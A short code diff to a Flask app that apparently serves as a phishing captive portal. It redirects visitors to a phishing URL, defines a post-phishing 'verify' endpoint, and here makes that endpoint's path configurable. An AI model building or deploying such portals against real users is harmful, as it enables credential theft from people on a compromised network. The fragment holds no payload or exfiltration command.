@@ -13,6 +13,7 @@ URL_REDIRECT_AFTER_LOGIN = None
 URL_PHISHINGCLOUD = None
 PORT = 80
 config = None
+config_pk = SettingsINI(C.CONFIG_PK_INI)
 
 
 def login_user(ip, iptables_binary_path):
@@ -29,10 +30,9 @@ def login():
             f"Login:: User: {request.remote_addr} redirecting to {URL_PHISHINGCLOUD}\n"
         )
         sys.stdout.flush()
-        return redirect(URL_PHISHINGCLOUD, code=302) 
-        #login_user(request.remote_addr, config.get("iptables", "path_binary"))
+        return redirect(URL_PHISHINGCLOUD, code=302)
 
-@app.route("/verify", methods=["GET", "POST"])
+@app.route("{}".format(config_pk.get("settings", "allow_user_login_endpoint")), methods=["GET", "POST"])
 def verifyUserAfterPhishingLogin():
     global  URL_PHISHINGCLOUD, config
     sys.stdout.write(
